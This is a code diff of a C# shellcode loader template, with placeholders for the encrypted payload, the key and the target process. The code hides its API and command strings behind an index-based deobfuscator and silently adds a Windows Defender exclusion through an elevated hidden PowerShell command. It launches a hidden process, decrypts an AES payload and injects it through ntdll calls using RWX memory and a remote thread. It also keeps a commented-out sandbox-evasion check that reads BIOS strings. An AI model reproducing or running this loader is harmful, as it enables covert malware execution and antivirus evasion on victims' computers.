@@ -4,56 +4,82 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Management;
-
-
+using System.Threading;
 
 class Program
 {
-private static string Deobfuscate(int[] indices)
-{
-    const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_- ";
-    char[] chars = new char[indices.Length];
-    for (int i = 0; i < indices.Length; i++)
-    {
-        int index = indices[i] % pool.Length;
-        chars[i] = pool[index];
-    }
-    return new string(chars);
-}
+    private static Random rng = new Random();
 
-   static void Main()
+    private static void RandomSleep(int minMs = 500, int maxMs = 2000)
+    {
+        int delay = rng.Next(minMs, maxMs);
+        Console.WriteLine($"[*] Sleeping for {delay}ms...");
+        Thread.Sleep(delay);
+    }
+
+    private static string Deobfuscate(int[] indices)
+    {
+        const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_- ";
+        char[] chars = new char[indices.Length];
+        for (int i = 0; i < indices.Length; i++)
+        {
+            int index = indices[i] % pool.Length;
+            chars[i] = pool[index];
+        }
+        return new string(chars);
+    }
+
+    static void Main()
     {
         try
         {
-  //          if (IsVirtualMachine())
-  //      {
-   //         Console.WriteLine("[!] VM detected, exiting...");
-   //         return;
-   //     }
+            Console.WriteLine("[*] Starting program...");
+
+            // if (IsVirtualMachine())
+            // {
+            //     Console.WriteLine("[!] VM detected, exiting...");
+            //     return;
+            // }
 
             byte[] encrypted = %%ENCRYPTED_BYTES%%;
             byte[] key = %%KEY_BYTES%%;
             string target = %%TARGET_PROCESS%%;
 
-            try
-{
-    AddDefenderExclusion(target + ".exe");
-}
-catch (Exception ex)
-{
-    Console.WriteLine("[!] Skipped Defender exclusion: " + ex.Message);
-}
+            Console.WriteLine($"[*] Target process: {target}");
 
-	System.Threading.Thread.Sleep(2000);
+            try
+            {
+                Console.WriteLine("[*] Attempting to add Defender exclusion...");
+                AddDefenderExclusion(target + ".exe");
+                Console.WriteLine("[+] Defender exclusion added.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Skipped Defender exclusion: " + ex.Message);
+            }
+
+            RandomSleep(1000, 3000);
+
             var proc = StartProcess(target);
             if (proc == null)
             {
-                Console.WriteLine("[-] Failed to start target");
+                Console.WriteLine("[-] Failed to start target process");
                 return;
             }
+            Console.WriteLine($"[+] Started process: {proc.Id}");
 
+            RandomSleep(1000, 2500);
+
+            Console.WriteLine("[*] Decrypting payload...");
             byte[] decrypted = DecryptPayload(encrypted, key);
+            Console.WriteLine("[+] Decryption complete");
+
+            RandomSleep(500, 1500);
+
+            Console.WriteLine("[*] Injecting payload...");
             InjectViaSyscall(proc.Id, decrypted);
+            Console.WriteLine("[+] Injection successful");
+
             Array.Clear(decrypted, 0, decrypted.Length);
         }
         catch (Exception ex)
@@ -62,75 +88,81 @@ catch (Exception ex)
         }
     }
 
-        static bool IsVirtualMachine()
-{
+    static bool IsVirtualMachine()
+    {
         if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-        return false;
-    
-    string[] vmIndicators = new[]
-    {
-        Deobfuscate(new[] { 21, 12, 48, 26, 43, 30 }),
-        Deobfuscate(new[] { 21, 34, 43, 45, 46, 26, 37 }),  
-        Deobfuscate(new[] { 21, 27, 40, 49 }),  
-        Deobfuscate(new[] { 23, 30, 39 }), 
-        Deobfuscate(new[] { 16, 4, 12, 20 }),   
-        Deobfuscate(new[] { 12, 34, 28, 43, 40, 44, 40, 31, 45 }),  
-        Deobfuscate(new[] { 7, 50, 41, 30, 43, 63, 21 }),  
-        Deobfuscate(new[] { 0, 38, 26, 51, 40, 39 }),  
-        Deobfuscate(new[] { 6, 40, 40, 32, 37, 30 })
-    };
+            return false;
 
-    string biosInfo = "";
-    try
-    {
-        using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
+        string[] vmIndicators = new[]
         {
-            foreach (ManagementObject obj in searcher.Get())
+            Deobfuscate(new[] { 21, 12, 48, 26, 43, 30 }),
+            Deobfuscate(new[] { 21, 34, 43, 45, 46, 26, 37 }),
+            Deobfuscate(new[] { 21, 27, 40, 49 }),
+            Deobfuscate(new[] { 23, 30, 39 }),
+            Deobfuscate(new[] { 16, 4, 12, 20 }),
+            Deobfuscate(new[] { 12, 34, 28, 43, 40, 44, 40, 31, 45 }),
+            Deobfuscate(new[] { 7, 50, 41, 30, 43, 63, 21 }),
+            Deobfuscate(new[] { 0, 38, 26, 51, 40, 39 }),
+            Deobfuscate(new[] { 6, 40, 40, 32, 37, 30 })
+        };
+
+        string biosInfo = "";
+        try
+        {
+            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
             {
-                biosInfo += obj["Manufacturer"]?.ToString() ?? "";
-                biosInfo += obj["SMBIOSBIOSVersion"]?.ToString() ?? "";
-                biosInfo += obj["Name"]?.ToString() ?? "";
-                Console.WriteLine($"  Manufacturer: {obj["Manufacturer"]}");
-                                Console.WriteLine($"  Name: {obj["Name"]}");
-                Console.WriteLine($"  Version: {obj["SMBIOSBIOSVersion"]}");
+                foreach (ManagementObject obj in searcher.Get())
+                {
+                    biosInfo += obj["Manufacturer"]?.ToString() ?? "";
+                    biosInfo += obj["SMBIOSBIOSVersion"]?.ToString() ?? "";
+                    biosInfo += obj["Name"]?.ToString() ?? "";
+
+                    Console.WriteLine($"  Manufacturer: {obj["Manufacturer"]}");
+                    Console.WriteLine($"  Name: {obj["Name"]}");
+                    Console.WriteLine($"  Version: {obj["SMBIOSBIOSVersion"]}");
+                }
             }
         }
-    }
-    catch { }
-
-    biosInfo = biosInfo.ToLower();
-    foreach (string indicator in vmIndicators)
-    {
-        if (biosInfo.Contains(indicator.ToLower()))
+        catch (Exception ex)
         {
-            Console.WriteLine("[!] Virtual Machine detected based on BIOS info: " + indicator);
-            return true;
+            Console.WriteLine("[!] VM check exception: " + ex.Message);
         }
 
+        biosInfo = biosInfo.ToLower();
+        foreach (string indicator in vmIndicators)
+        {
+            if (biosInfo.Contains(indicator.ToLower()))
+            {
+                Console.WriteLine("[!] Virtual Machine detected based on BIOS info: " + indicator);
+                return true;
+            }
+        }
+
+        return false;
     }
 
-    return false;
-}
-
     static void AddDefenderExclusion(string exeName)
-{
-    string powershell = Deobfuscate(new[] { 41, 40, 48, 30, 43, 44, 33, 30, 37, 37 });
-    string cmd = Deobfuscate(new[] { 0, 29, 29, 63, 12, 41, 15, 43, 30, 31, 30, 43, 30, 39, 28, 30, 64, 63, 4, 49, 28, 37, 46, 44, 34, 40, 39, 15, 43, 40, 28, 30, 44, 44 });
-
-    string command = $"{powershell} -Command \"{cmd} '{exeName}'\"";
-    var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
     {
-        CreateNoWindow = true,
-        Verb = "runas",
-        UseShellExecute = true
-    };
-    Process.Start(psi);
-}
+        string powershell = Deobfuscate(new[] { 41, 40, 48, 30, 43, 44, 33, 30, 37, 37 });
+        string cmd = Deobfuscate(new[] { 0, 29, 29, 63, 12, 41, 15, 43, 30, 31, 30, 43, 30, 39, 28, 30, 64, 63, 4, 49, 28, 37, 46, 44, 34, 40, 39, 15, 43, 40, 28, 30, 44, 44 });
+
+        string command = $"{powershell} -Command \"{cmd} '{exeName}'\"";
+        Console.WriteLine("[*] PowerShell Exclusion Command: " + command);
+
+        var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
+        {
+            CreateNoWindow = true,
+            Verb = "runas",
+            UseShellExecute = true
+        };
+        Process.Start(psi);
+    }
 
     static Process? StartProcess(string name)
     {
         try
         {
+            Console.WriteLine("[*] Launching process...");
             return Process.Start(new ProcessStartInfo
             {
                 FileName = name + ".exe",
@@ -139,10 +171,14 @@ catch (Exception ex)
                 WindowStyle = ProcessWindowStyle.Hidden
             });
         }
-        catch { return null; }
+        catch (Exception ex)
+        {
+            Console.WriteLine("[!] Error launching process: " + ex.Message);
+            return null;
+        }
     }
 
-static byte[] DecryptPayload(byte[] encryptedBytes, byte[] key)
+    static byte[] DecryptPayload(byte[] encryptedBytes, byte[] key)
     {
         using (Aes aes = Aes.Create())
         {
@@ -153,8 +189,6 @@ static byte[] DecryptPayload(byte[] encryptedBytes, byte[] key)
             using (ICryptoTransform decryptor = aes.CreateDecryptor())
             {
                 byte[] decryptedBytes = decryptor.TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);
-                
-                // Remove PKCS7 padding
                 int paddingSize = decryptedBytes[^1];
                 byte[] rawPayload = new byte[decryptedBytes.Length - paddingSize];
                 Array.Copy(decryptedBytes, rawPayload, rawPayload.Length);
@@ -163,62 +197,58 @@ static byte[] DecryptPayload(byte[] encryptedBytes, byte[] key)
         }
     }
 
-static void InjectViaSyscall(int pid, byte[] payload)
-{
-    IntPtr ntdll = Win32.LoadLibrary("ntdll.dll");
-    if (ntdll == IntPtr.Zero)
-        throw new Exception("Failed to load ntdll.dll");
+    static void InjectViaSyscall(int pid, byte[] payload)
+    {
+        Console.WriteLine("[*] Loading ntdll.dll...");
+        IntPtr ntdll = Win32.LoadLibrary("ntdll.dll");
+        if (ntdll == IntPtr.Zero)
+            throw new Exception("Failed to load ntdll.dll");
 
-// Corrected indices to produce the proper function names:
-string openName = Deobfuscate(new[] {13, 45, 14, 41, 30, 39, 15, 43, 40, 28, 30, 44, 44}); 
-string allocName = Deobfuscate(new[] {13, 45, 0, 37, 37, 40, 28, 26, 45, 30, 21, 34, 43, 45, 46, 26, 37, 12, 30, 38, 40, 43, 50}); 
-string writeName = Deobfuscate(new[] {13, 45, 22, 43, 34, 45, 30, 21, 34, 43, 45, 46, 26, 37, 12, 30, 38, 40, 43, 50}); 
-string threadName = Deobfuscate(new[] {13, 45, 2, 43, 30, 26, 45, 30, 19, 33, 43, 30, 26, 29, 4, 49});
+        string openName = Deobfuscate(new[] { 13, 45, 14, 41, 30, 39, 15, 43, 40, 28, 30, 44, 44 });
+        string allocName = Deobfuscate(new[] { 13, 45, 0, 37, 37, 40, 28, 26, 45, 30, 21, 34, 43, 45, 46, 26, 37, 12, 30, 38, 40, 43, 50 });
+        string writeName = Deobfuscate(new[] { 13, 45, 22, 43, 34, 45, 30, 21, 34, 43, 45, 46, 26, 37, 12, 30, 38, 40, 43, 50 });
+        string threadName = Deobfuscate(new[] { 13, 45, 2, 43, 30, 26, 45, 30, 19, 33, 43, 30, 26, 29, 4, 49 });
 
+        IntPtr openPtr = Win32.GetProcAddress(ntdll, openName);
+        IntPtr allocPtr = Win32.GetProcAddress(ntdll, allocName);
+        IntPtr writePtr = Win32.GetProcAddress(ntdll, writeName);
+        IntPtr threadPtr = Win32.GetProcAddress(ntdll, threadName);
 
-    // Console.WriteLine($"    {openName}");
-    // Console.WriteLine($"    {allocName}");
-    // Console.WriteLine($"    {writeName}");
-    // Console.WriteLine($"    {threadName}");
+        if (openPtr == IntPtr.Zero || allocPtr == IntPtr.Zero || writePtr == IntPtr.Zero || threadPtr == IntPtr.Zero)
+            throw new Exception("Failed to resolve one or more syscall addresses");
 
-    IntPtr openPtr = Win32.GetProcAddress(ntdll, openName);
-    IntPtr allocPtr = Win32.GetProcAddress(ntdll, allocName);
-    IntPtr writePtr = Win32.GetProcAddress(ntdll, writeName);
-    IntPtr threadPtr = Win32.GetProcAddress(ntdll, threadName);
+        var open = Marshal.GetDelegateForFunctionPointer<Win32.NtOpenProcessDelegate>(openPtr);
+        var alloc = Marshal.GetDelegateForFunctionPointer<Win32.NtAllocateVirtualMemoryDelegate>(allocPtr);
+        var write = Marshal.GetDelegateForFunctionPointer<Win32.NtWriteVirtualMemoryDelegate>(writePtr);
+        var thread = Marshal.GetDelegateForFunctionPointer<Win32.NtCreateThreadExDelegate>(threadPtr);
 
-    if (openPtr == IntPtr.Zero || allocPtr == IntPtr.Zero || writePtr == IntPtr.Zero || threadPtr == IntPtr.Zero)
-        throw new Exception("Failed to resolve one or more syscall addresses");
+        var cid = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)pid };
+        var attr = new Win32.OBJECT_ATTRIBUTES();
+        IntPtr hProc;
 
-    var open = Marshal.GetDelegateForFunctionPointer<Win32.NtOpenProcessDelegate>(openPtr);
-    var alloc = Marshal.GetDelegateForFunctionPointer<Win32.NtAllocateVirtualMemoryDelegate>(allocPtr);
-    var write = Marshal.GetDelegateForFunctionPointer<Win32.NtWriteVirtualMemoryDelegate>(writePtr);
-    var thread = Marshal.GetDelegateForFunctionPointer<Win32.NtCreateThreadExDelegate>(threadPtr);
+        Win32.NTSTATUS st = open(out hProc, 0x1F0FFF, ref attr, ref cid);
+        if (st != Win32.NTSTATUS.Success)
+            throw new Exception("xNtOpenProcessx failed");
 
-    var cid = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)pid };
-    var attr = new Win32.OBJECT_ATTRIBUTES();
-    IntPtr hProc;
+        IntPtr addr = IntPtr.Zero;
+        IntPtr len = (IntPtr)payload.Length;
+        st = alloc(hProc, ref addr, IntPtr.Zero, ref len, 0x3000, 0x40);
+        if (st != Win32.NTSTATUS.Success)
+            throw new Exception("xNtAllocateVirtualMemoryx failed");
 
-    Win32.NTSTATUS st = open(out hProc, 0x1F0FFF, ref attr, ref cid);
-    if (st != Win32.NTSTATUS.Success)
-        throw new Exception("xNtOpenProcessx failed");
+        st = write(hProc, addr, payload, payload.Length, out _);
+        if (st != Win32.NTSTATUS.Success)
+            throw new Exception("xNtWriteVirtualMemoryx failed");
 
-    IntPtr addr = IntPtr.Zero;
-    IntPtr len = (IntPtr)payload.Length;
-    st = alloc(hProc, ref addr, IntPtr.Zero, ref len, 0x3000, 0x40);
-    if (st != Win32.NTSTATUS.Success)
-        throw new Exception("xNtAllocateVirtualMemoryx failed");
+        st = thread(out var hThread, 0x1FFFFF, IntPtr.Zero, hProc, addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+        if (st != Win32.NTSTATUS.Success)
+            throw new Exception("xNtCreateThreadExx failed");
 
-    st = write(hProc, addr, payload, payload.Length, out _);
-    if (st != Win32.NTSTATUS.Success)
-        throw new Exception("xNtWriteVirtualMemoryx failed");
+        Console.WriteLine("[+] Shellcode thread started.");
 
-    st = thread(out var hThread, 0x1FFFFF, IntPtr.Zero, hProc, addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
-    if (st != Win32.NTSTATUS.Success)
-        throw new Exception("xNtCreateThreadExx failed");
-
-    Win32.NtClose(hProc);
-    Win32.NtClose(hThread);
-}
+        Win32.NtClose(hProc);
+        Win32.NtClose(hThread);
+    }
 
     static class Win32
     {
